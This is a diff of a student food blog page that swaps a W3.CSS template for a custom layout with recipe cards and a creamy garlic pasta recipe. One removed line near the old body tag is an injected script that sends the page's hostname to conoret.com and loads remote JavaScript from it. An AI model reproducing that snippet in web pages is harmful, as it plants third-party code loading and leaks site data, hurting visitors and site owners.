@@ -1,160 +1,245 @@
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<title>Food Page</title>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bloom Your Vibe - Food Blog</title>
+   <style>
+    /* General Styling */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f8f8f8;
+    color: #333;
+}
 
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="./food_files/w3.css">
-<link rel="stylesheet" href="./food_files/css">
-<style>
-body,h1,h2,h3,h4,h5,h6 {font-family: "Karma", sans-serif}
-.w3-bar-block .w3-bar-item {padding:20px}
-</style>
+header {
+    background-color: #ff6b6b;
+    color: #fff;
+    padding: 20px;
+    text-align: center;
+}
+
+header h1 {
+    font-size: 2em;
+    margin: 0;
+}
+
+nav {
+    display: flex;
+    justify-content: center;
+    background-color: #333;
+    padding: 10px;
+}
+
+nav a {
+    color: #fff;
+    padding: 10px 15px;
+    text-decoration: none;
+    margin: 0 5px;
+    font-weight: bold;
+    transition: background-color 0.3s;
+}
+
+nav a:hover {
+    background-color: #ff6b6b;
+}
+
+/* Main Styling */
+main {
+    padding: 20px;
+}
+
+.featured-recipes {
+    display: flex;
+    justify-content: space-around;
+    gap: 20px;
+    flex-wrap: wrap;
+    margin-bottom: 40px;
+}
+
+.recipe {
+    background-color: #fff;
+    border-radius: 10px;
+    padding: 20px;
+    width: 300px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    transition: transform 0.3s;
+}
+
+.recipe:hover {
+    transform: scale(1.05);
+}
+
+.recipe img {
+    width: 100%;
+    height: auto;
+    border-radius: 10px;
+}
+
+.info {
+    margin-top: 10px;
+}
+
+.info h3 {
+    font-size: 1.2em;
+    margin-bottom: 5px;
+}
+
+.details {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.9em;
+    color: #555;
+}
+
+.category {
+    background-color: #eaeaea;
+    padding: 5px;
+    border-radius: 5px;
+}
+
+.view-recipe-btn {
+    margin-top: 10px;
+    background-color: #ff6b6b;
+    color: #fff;
+    padding: 10px;
+    text-align: center;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.view-recipe-btn:hover {
+    background-color: #333;
+}
+
+/* Recipe Details Section */
+.recipe-details {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+}
+
+.recipe-details h2 {
+    font-size: 1.8em;
+    color: #333;
+    margin-top: 0;
+}
+
+.recipe-details h3 {
+    font-size: 1.4em;
+    color: #ff6b6b;
+    margin-top: 20px;
+}
+
+.recipe-details ul, .recipe-details ol {
+    margin: 0;
+    padding-left: 20px;
+    line-height: 1.8;
+}
+
+footer {
+    background-color: #333;
+    color: #fff;
+    text-align: center;
+    padding: 15px;
+    font-size: 0.9em;
+}
+
+   </style>
 </head>
-<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+<body>
+    <!-- Header Section -->
+    <header>
+        <h1>Bloom Your Vibe - Food Blog</h1>
+        <p>Discover delicious recipes and cooking tips to inspire your kitchen creations!</p>
+    </header>
 
-<!-- Sidebar (hidden by default) -->
-<nav class="w3-sidebar w3-bar-block w3-card w3-top w3-xlarge w3-animate-left" style="display:none;z-index:2;width:40%;min-width:300px" id="mySidebar">
-  <a href="javascript:void(0)" onclick="w3_close()" class="w3-bar-item w3-button">Close Menu</a>
-  <a href="https://vinay240605.github.io/LifeStyle/food.html" onclick="w3_close()" class="w3-bar-item w3-button">Food</a>
-  <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#about" onclick="w3_close()" class="w3-bar-item w3-button">About</a>
-</nav>
+    <!-- Navigation with link back to the index page -->
+    <nav>
+        <a href="index.html">Home</a>
+        <a href="food.html">Food</a>
+        <a href="lifestyle.html">Lifestyle</a>
+        <a href="travel.html">Travel</a>
+        <a href="contact.html">Contact</a>
+    </nav>
 
-<!-- Top menu -->
-<div class="w3-top">
-  <div class="w3-white w3-xlarge" style="max-width:1200px;margin:auto">
-    <div class="w3-button w3-padding-16 w3-left" onclick="w3_open()">☰</div>
-    <div class="w3-right w3-padding-16">Mail</div>
-    <div class="w3-center w3-padding-16">My Food</div>
-  </div>
-</div>
-  
-<!-- !PAGE CONTENT! -->
-<div class="w3-main w3-content w3-padding" style="max-width:1200px;margin-top:100px">
+    <!-- Main Content -->
+    <main>
+        <!-- Featured Recipes Section -->
+        <section class="featured-recipes">
+            <div class="recipe">
+                <img src="pasta.jpg" alt="Creamy Pasta">
+                <div class="info">
+                    <h3>Creamy Garlic Pasta</h3>
+                    <div class="details">
+                        <span class="category">Italian</span>
+                        <span class="time">30 mins</span>
+                    </div>
+                    <p>A creamy, savory pasta dish perfect for a quick weeknight dinner.</p>
+                    <button class="view-recipe-btn">View Recipe</button>
+                </div>
+            </div>
+            <div class="recipe">
+                <img src="salad.jpg" alt="Fresh Garden Salad">
+                <div class="info">
+                    <h3>Fresh Garden Salad</h3>
+                    <div class="details">
+                        <span class="category">Healthy</span>
+                        <span class="time">15 mins</span>
+                    </div>
+                    <p>Crunchy, vibrant, and packed with nutrients – ideal for any meal.</p>
+                    <button class="view-recipe-btn">View Recipe</button>
+                </div>
+            </div>
+            <div class="recipe">
+                <img src="pancakes.jpg" alt="Fluffy Pancakes">
+                <div class="info">
+                    <h3>Fluffy Pancakes</h3>
+                    <div class="details">
+                        <span class="category">Breakfast</span>
+                        <span class="time">20 mins</span>
+                    </div>
+                    <p>Perfectly fluffy pancakes that are a favorite for weekend mornings.</p>
+                    <button class="view-recipe-btn">View Recipe</button>
+                </div>
+            </div>
+        </section>
 
-  <!-- First Photo Grid-->
-  <div class="w3-row-padding w3-padding-16 w3-center" id="food">
-    <div class="w3-quarter">
-      <img src="./food_files/sandwich.jpg" alt="Sandwich" style="width:100%">
-      <h3>The Perfect Sandwich, A Real NYC Classic</h3>
-      <p>Just some random text, lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-    <div class="w3-quarter">
-      <img src="./food_files/steak.jpg" alt="Steak" style="width:100%">
-      <h3>Let Me Tell You About This Steak</h3>
-      <p>Once again, some random text to lorem lorem lorem lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-    <div class="w3-quarter">
-      <img src="./food_files/cherries.jpg" alt="Cherries" style="width:100%">
-      <h3>Cherries, interrupted</h3>
-      <p>Lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-      <p>What else?</p>
-    </div>
-    <div class="w3-quarter">
-      <img src="./food_files/wine.jpg" alt="Pasta and Wine" style="width:100%">
-      <h3>Once Again, Robust Wine and Vegetable Pasta</h3>
-      <p>Lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-  </div>
-  
-  <!-- Second Photo Grid-->
-  <div class="w3-row-padding w3-padding-16 w3-center">
-    <div class="w3-quarter">
-      <img src="./food_files/popsicle.jpg" alt="Popsicle" style="width:100%">
-      <h3>All I Need Is a Popsicle</h3>
-      <p>Lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-    <div class="w3-quarter">
-      <img src="./food_files/salmon.jpg" alt="Salmon" style="width:100%">
-      <h3>Salmon For Your Skin</h3>
-      <p>Once again, some random text to lorem lorem lorem lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-    <div class="w3-quarter">
-      <img src="./food_files/sandwich.jpg" alt="Sandwich" style="width:100%">
-      <h3>The Perfect Sandwich, A Real Classic</h3>
-      <p>Just some random text, lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-    <div class="w3-quarter">
-      <img src="./food_files/croissant.jpg" alt="Croissant" style="width:100%">
-      <h3>Le French</h3>
-      <p>Lorem lorem lorem lorem ipsum text praesent tincidunt ipsum lipsum.</p>
-    </div>
-  </div>
+        <!-- Recipe Instructions Section -->
+        <section class="recipe-details">
+            <h2>Creamy Garlic Pasta Recipe</h2>
+            <h3>Ingredients:</h3>
+            <ul>
+                <li>200g pasta of choice</li>
+                <li>1 cup heavy cream</li>
+                <li>1/4 cup Parmesan cheese, grated</li>
+                <li>3 garlic cloves, minced</li>
+                <li>2 tbsp olive oil</li>
+                <li>Salt and pepper to taste</li>
+                <li>Chopped parsley for garnish</li>
+            </ul>
 
-  <!-- Pagination -->
-  <div class="w3-center w3-padding-32">
-    <div class="w3-bar">
-      <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#" class="w3-bar-item w3-button w3-hover-black">«</a>
-      <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#" class="w3-bar-item w3-black w3-button">1</a>
-      <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#" class="w3-bar-item w3-button w3-hover-black">2</a>
-      <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#" class="w3-bar-item w3-button w3-hover-black">3</a>
-      <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#" class="w3-bar-item w3-button w3-hover-black">4</a>
-      <a href="https://www.w3schools.com/w3css/tryw3css_templates_food_blog.htm#" class="w3-bar-item w3-button w3-hover-black">»</a>
-    </div>
-  </div>
-  
-  <hr id="about">
+            <h3>Instructions:</h3>
+            <ol>
+                <li>Cook the pasta according to package instructions until al dente. Drain and set aside.</li>
+                <li>In a large skillet, heat the olive oil over medium heat and add the minced garlic. Sauté for 1-2 minutes until fragrant.</li>
+                <li>Reduce heat to low, add the heavy cream and Parmesan cheese, stirring constantly until the sauce thickens.</li>
+                <li>Add the cooked pasta to the skillet and toss to coat with the creamy sauce.</li>
+                <li>Season with salt and pepper. Garnish with chopped parsley and extra Parmesan if desired.</li>
+                <li>Serve immediately and enjoy your creamy garlic pasta!</li>
+            </ol>
+        </section>
+    </main>
 
-  <!-- About Section -->
-  <div class="w3-container w3-padding-32 w3-center">  
-    <h3>About Me, The Food Man</h3><br>
-    <img src="./food_files/chef.jpg" alt="Me" class="w3-image" style="display:block;margin:auto" width="800" height="533">
-    <div class="w3-padding-32">
-      <h4><b>I am Who I Am!</b></h4>
-      <h6><i>With Passion For Real, Good Food</i></h6>
-      <p>Just me, myself and I, exploring the universe of unknownment. I have a heart of love and an interest of lorem ipsum and mauris neque quam blog. I want to share my world with you. Praesent tincidunt sed tellus ut rutrum. Sed vitae justo condimentum, porta lectus vitae, ultricies congue gravida diam non fringilla. Praesent tincidunt sed tellus ut rutrum. Sed vitae justo condimentum, porta lectus vitae, ultricies congue gravida diam non fringilla.</p>
-    </div>
-  </div>
-  <hr>
-  
-  <!-- Footer -->
-  <footer class="w3-row-padding w3-padding-32">
-    <div class="w3-third">
-      <h3>FOOTER</h3>
-      <p>Praesent tincidunt sed tellus ut rutrum. Sed vitae justo condimentum, porta lectus vitae, ultricies congue gravida diam non fringilla.</p>
-      <p>Designed and recreated by <a href="https://svit.ac.in/" target="_blank">SVIT Students</a></p>
-    </div>
-  
-    <div class="w3-third">
-      <h3>BLOG POSTS</h3>
-      <ul class="w3-ul w3-hoverable">
-        <li class="w3-padding-16">
-          <img src="./food_files/workshop.jpg" class="w3-left w3-margin-right" style="width:50px">
-          <span class="w3-large">Lorem</span><br>
-          <span>Sed mattis nunc</span>
-        </li>
-        <li class="w3-padding-16">
-          <img src="./food_files/gondol.jpg" class="w3-left w3-margin-right" style="width:50px">
-          <span class="w3-large">Ipsum</span><br>
-          <span>Praes tinci sed</span>
-        </li> 
-      </ul>
-    </div>
-
-    <div class="w3-third w3-serif">
-      <h3>POPULAR TAGS</h3>
-      <p>
-        <span class="w3-tag w3-black w3-margin-bottom">Travel</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">New York</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Dinner</span>
-        <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Salmon</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">France</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Drinks</span>
-        <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Ideas</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Flavors</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Cuisine</span>
-        <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Chicken</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Dressing</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Fried</span>
-        <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Fish</span> <span class="w3-tag w3-dark-grey w3-small w3-margin-bottom">Duck</span>
-      </p>
-    </div>
-  </footer>
-
-<!-- End page content -->
-</div>
-
-<script>
-// Script to open and close sidebar
-function w3_open() {
-  document.getElementById("mySidebar").style.display = "block";
-}
- 
-function w3_close() {
-  document.getElementById("mySidebar").style.display = "none";
-}
-</script>
-
-
-</body></html>
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2024 Bloom Your Vibe. All rights reserved.</p>
+    </footer>
+</body>
+</html>
